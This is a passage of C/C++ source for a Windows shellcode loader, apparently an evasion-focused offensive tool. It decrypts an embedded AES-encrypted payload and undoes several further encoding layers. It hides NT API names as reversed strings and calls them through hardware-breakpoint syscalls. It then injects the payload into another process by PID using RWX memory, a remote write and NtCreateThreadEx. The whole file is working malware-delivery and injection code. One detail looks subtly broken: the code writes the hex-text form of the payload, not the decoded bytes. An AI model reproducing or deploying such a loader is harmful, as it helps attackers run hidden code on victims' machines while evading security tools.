	IN ULONG Reserved
	);


typedef NTSTATUS(NTAPI* NtReadFile_t)(
	IN    HANDLE           FileHandle,
	IN OPTIONAL HANDLE           Event,
	IN OPTIONAL PIO_APC_ROUTINE  ApcRoutine,
	IN OPTIONAL PVOID            ApcContext,
	OUT    PIO_STATUS_BLOCK IoStatusBlock,
	OUT    PVOID            Buffer,
	IN     ULONG            Length,
	IN OPTIONAL PLARGE_INTEGER   ByteOffset,
	IN OPTIONAL PULONG           Key
	);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
	IN HANDLE pHandle,
	IN PVOID baseAddress,
	IN LPCVOID lpBuffer,
	IN SIZE_T nSize,
	OUT SIZE_T* lpNumberOfBytesWritten
	);

typedef NTSTATUS(NTAPI* NtWaitForSingleObject)(
	IN HANDLE Handle,
	IN BOOLEAN Alertable,
	IN PLARGE_INTEGER Timeout
	);

typedef struct _CLIENT_ID
{
	PVOID UniqueProcess;
	PVOID UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef NTSTATUS(NTAPI* NtOpenProcess_t)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);

#define InitializeObjectAttributes(p, n, a, r, s) \
{ \
	(p)->Length = sizeof(OBJECT_ATTRIBUTES); \
	(p)->RootDirectory = r; \
	(p)->Attributes = a; \
	(p)->ObjectName = n; \
	(p)->SecurityDescriptor = s; \
	(p)->SecurityQualityOfService = NULL; \
}

void reverseStr(char* str, int nSize)
{
	for (int i = 0; i < nSize / 2; i++)
		std::swap(str[i], str[nSize - i - 1]);
	return;
}


char cNtAllocateVirtualMemory[] = "yromeMlautriVetacollAtN";
char cNtCreateThreadEx[] = "xEdaerhTetaerCtN";
char cNtWaitForSingleObject[] = "tcejbOelgniSroFtiaWtN";

unsigned char shellcode[] = { "\x2e\xa8\x9e\x8d\x40\x10\xe4\x58\x3d\x4c\xe6\xac\x83\x3e\x1d\xbc\xe5\x98\x83\xf1\xcf\x17\x57\x47\x15\x49\x3f\x11\x19\xa1\x57\x8b\x22\x39\xcd\x4c\xe5\x44\xe1\xa6\x55\x4c\xeb\xe1\x93\xc8\x22\xde\x0a\x87\x1b\xfe\xbf\xf6\x14\xfb\x10\x38\x23\x94\x72\xde\x65\xd9\xb9\xbf\xa4\x37\xf1\xb3\x2b\x15\xf0\x26\xce\xd5\x68\x20\xc3\x0e\x9f\x68\x80\x5e\x6b\x50\x52\x0a\xa5\x17\xf7\x2c\x31\x7f\xef\x5d\xee\x46\xcc\xa0\x7f\xac\xd2\xe7\x42\xae\x23\x04\x7e\x3b\x17\x61\x8d\x57\x94\x4b\xb2\xa5\xd0\x82\x38\x02\x8a\x74\x5b\x8b\x35\x40\x16\x70\xb1\x7b\x40\x89\x6c\x5c\x62\xb3\xcd\x9e\xce\x34\xb0\xad\xb6\x74\x09\xc1\x03\x2c\x46\x68\x40\x1c\x61\xac\x4a\xaf\x2c\x18\x7c\x70\x1f\x80\xba\x2f\x1f\x51\x73\xc1\xda\x00\xb9\xf1\x09\x44\x9f\x73\xfc\x58\x6d\x18\x1c\x15\x31\x17\x28\x3d\x87\xf8\x81\xcd\xa5\x30\xbc\x99\x87\x53\xbf\x49\xfd\xd6\x2a\x55\xb8\x50\x26\x6b\x0c\x54\x4c\x35\x59\xfe\xe2\x10\xa3\xda\xdb\x4e\x87\x30\x64\x62\x2c\x37\x50\xfe\x11\xe1\x66\x82\xd2\x6a\x9a\xd6\x59\x4a\xf1\xd0\xe0\x35\xc9\xf4\x69\xbf\x8e\x0d\x7c\xd1\xef\x93\x9c\x4c\x46\x3d\xfd\x1c\xef\x77\xd5\xed\x15\xd1\x91\x2d\x56\x8b\xd5\xec\x63\xb9\xf1\x7c\x08\x80\x99\xba\x45\xcd\x12\xdd\x2a\x35\xbe\x0e\x95\x89\x53\x0d\x8f\x55\xbd\x75\xed\x28\x26\xa4\x72\xa0\x3d\xc9\x81\xa3\x6b\x64\xbe\xbc\xcb\x4d\x42\x23\x8e\xe6\x6c\x45\xb3\x52\x54\x2a" };
unsigned char aeskey[] = { "\xf5\x00\xbb\x54\x5a\x8e\x8d\x9e\xc0\xb6\x35\x89\x57\xc4\x36\x43\x1a\xa4\xad\xee\xd4\x46\xb1\x16\x99\xef\x5f\x63\x2c\x3c\x55\x27" };
unsigned char iv[] = { "\x24\x1b\xd5\x4e\x4d\x1a\xa9\x3d\x34\x87\x98\x6d\xf0\xd2\xb6\x2a" };
unsigned char xorkey[] = { "\xe0\x02\xe0\xbf\xc1\x80\x61\x60\xfe\x2b\xfd\x0b\x72\x4d\x58\xe7\x23\x39\xb5\xbc\xb8\x85\x42\xf2\xa7\xe0\xbe\x55\xbf\xf5\x24\xa0\xf7\x04\x5f\xb8\x85\xc0\x19\x83\xeb\x16\x8e\x5d\x63\xe6\x45\x86\x1f\xfa\x42\xd7\x7f\x84\xca\x27\x65\x88\x7c\x24\x7d\xa0\xc4\x75\xa4\x23\x2d\x29\xe4\x46\xac\xcf\x5d\x3a\x2d\xc0\x20\x72\x47\x40\x6c\x89\x17\xec\x0e\xe1\x13\x73\x6a\x8f\x97\xe7\x2f\x5c\x5c\xd3\x7f\x8a\xfd\x63\xd0\xa9\x33\x2d\xe4\x60\xee\x04\xd2\x35\x44\x3e\xbe\x5c\x2a\xcc\x3d\x3d\x3f\xa7\xcc\xd7\x8f\xfb\x33\xeb\xcf\xb2\x75\xcc\x16\x46\x75\x49\x73\x59\xa9\x61\x5e\x7b\x96\xa2\xb9\x55\xfe\xe4\x21\x3c\x21\x61\xe3\xee\x38\x72\xe9\x6b\x5e\xb8\x1d\xd3\x84\x33\x19\xfa\x7c\x8d\x53\x25\xee\xb1\xa0\x85\x54\x5a\xda\x52\x3e\xfb\x8e\x5f\x5c\x72\x4d\x94\xe4\x37\xff\x42\xef\x1d\x16\x74\x50\x2f\x6e\xcd\xbc\xc1\xf2\xab\x73\x93\x30\xc7\xed\x0a\x19\x2b\x05\xa8\x8a\x62\x1a\xd8\xf6\xfe\x0f\xf6\x41\xfe\x13\x57\x72\x63\x86\xe0\x30\x43\xa2\x23\xee\x15\xb6\x1e\xdc\xa3\x28\xf5\xce\x2d\x9d\x58\x8f\xb7\x30\x86\xb6\x3f\x7c\xf7\x3e\x8f\x4e\xb0\xf2\xd4\x91\x23\x17\x33\x46\x05\x48\xfc\x23\x24\x9f\x4b\x19\x6d\x79\xb7\xc5\x08\x6e\xf6\x8e\x24\x35\x0a\x1b\x73\x99\x69\x24\x8c\x3e\xb5\xaf\x55\xe8\xf5\x5b\x30\xf1\x7e\x54\x90\xca\x6d\xfd\x43\x24\xc2\x4b\x93\xb8\xda\xb7\xee\xe4\xd3" };
int rot = 5;
int dec = 207;
int iterations = 5;
int shellcodeLength = 312;

void xor_encoding(unsigned char* shellcode, size_t length, unsigned char* xorkey, size_t key_length) {
    for (size_t i = 0; i < length; i++) {
        shellcode[i] ^= xorkey[i % key_length];
    }
}

void not_encoding(unsigned char* shellcode, size_t length) {
    for (size_t i = 0; i < length; i++) {
        shellcode[i] = ~shellcode[i];
    }
}

void rot_encoding(unsigned char* shellcode, size_t length, unsigned int rotation) {
    for (size_t i = 0; i < length; i++) {
        shellcode[i] = (shellcode[i] << rotation) | (shellcode[i] >> (8 - rotation));
    }
}

void dec_encoding(unsigned char* shellcode, size_t length, unsigned char decrement) {
    for (size_t i = 0; i < length; i++) {
        shellcode[i] -= decrement;
    }
}

void decrypt_aes_cbc(unsigned char* shellcode, int shellcode_len, unsigned char* aeskey, unsigned char* iv) {
    struct AES_ctx ctx;
    AES256CBC_init_ctx_iv(&ctx, aeskey, iv);
    AES256CBC_decrypt(&ctx, shellcode, shellcode_len);
}

char* format_hex(unsigned char* hex, size_t length) {
	size_t buffer_size = (length * 4) + 1; // Each byte takes four characters (\xXX)
	char* formatted_hex = (char*)malloc(buffer_size * sizeof(char));
	if (formatted_hex == NULL) {
		fprintf(stderr, "Memory allocation failed.\n");
		exit(1);
	}
	for (size_t i = 0; i < length; i++) {
		snprintf(formatted_hex + (i * 4), buffer_size - (i * 4), "\\x%02x", hex[i]);
	}
	return formatted_hex;
}

int main() {
    int i, shellcode_len = sizeof(shellcode), ciphertext_len = shellcode_len - 1, aeskey_length = sizeof(aeskey) - 1, xorkey_length = sizeof(xorkey) - 1;
    unsigned char* ciphertext = (unsigned char*)malloc(ciphertext_len);
    if (ciphertext != NULL) {
        memcpy(ciphertext, shellcode, ciphertext_len);
        decrypt_aes_cbc(ciphertext, ciphertext_len, aeskey, iv);
        for (i = 0; i < iterations; i++) {
            dec_encoding(ciphertext, ciphertext_len, -dec);
            rot_encoding(ciphertext, ciphertext_len, 8 - rot);
            not_encoding(ciphertext, ciphertext_len);
            xor_encoding(ciphertext, ciphertext_len, xorkey, xorkey_length);
        }
        printf("SHELLCODE DECODED/DECRYPTED:\n");
		char* formatted_hex = format_hex(ciphertext, shellcodeLength);
        //free(ciphertext);
		if (!InitHWSyscalls())
			return -1;

		char cNtReadFile[] = "eliFdaeRtN";
		char cNtProtectVirtualMemory[] = "yromeMlautriVtcetorPtN";
		char cNtWriteVirtualMemory[] = "yromeMlautriVetirWtN";
		char cNtOpenProcess[] = "ssecorPnepOtN";

		//start
		NTSTATUS status;
		HANDLE hThread = NULL;
		HANDLE hproc = (HANDLE)-1; //handle to current process
		PVOID memoryAddress = static_cast<PVOID>(formatted_hex);
		// allocate memory for shellcode
		reverseStr(cNtAllocateVirtualMemory, SIZEOF(cNtAllocateVirtualMemory));
		NtAllocateVirtualMemory_t allocvirtualmemory = (NtAllocateVirtualMemory_t)PrepareSyscall((char*)cNtAllocateVirtualMemory);
		allocvirtualmemory(hproc, &memoryAddress, 0, (PULONG)&shellcodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		//open handle to remote process
		int pid = 6196;
		OBJECT_ATTRIBUTES objAttr;
		HANDLE hProcess;
		CLIENT_ID cID;
		InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
		cID.UniqueProcess = (PVOID)pid;
		cID.UniqueThread = 0;
		reverseStr(cNtOpenProcess, SIZEOF(cNtOpenProcess));
		NtOpenProcess_t openprocess = (NtOpenProcess_t)PrepareSyscall((char*)cNtOpenProcess);
		openprocess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cID);
		if (!hProcess) {
			printf("Failed to open process");
			return -1;
		}
		//Allocate remote memory
		LPVOID allocation_start = nullptr;
		status = allocvirtualmemory(hProcess, &allocation_start, 0, (PULONG)&shellcodeLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		//write remote shellcode
		reverseStr(cNtWriteVirtualMemory, SIZEOF(cNtWriteVirtualMemory));
		NtWriteVirtualMemory_t writememory = (NtWriteVirtualMemory_t)PrepareSyscall((char*)cNtWriteVirtualMemory);
		status = writememory(hProcess, allocation_start, (PVOID)formatted_hex, shellcodeLength, 0);
		//create thread from shellcode
		reverseStr(cNtCreateThreadEx, SIZEOF(cNtCreateThreadEx));
		NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscall((char*)cNtCreateThreadEx);
		status = pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProcess, (LPTHREAD_START_ROUTINE)allocation_start, NULL, NULL, NULL, NULL, NULL, NULL);
		CloseHandle(hproc);
		CloseHandle(hProcess);

		if (DeinitHWSyscalls())
			std::cout << "1337 hax skiddo" << std::endl;
		else
			std::cerr << "Something went wrong :d" << std::endl;

        return 0;
    }
    return 1;
}
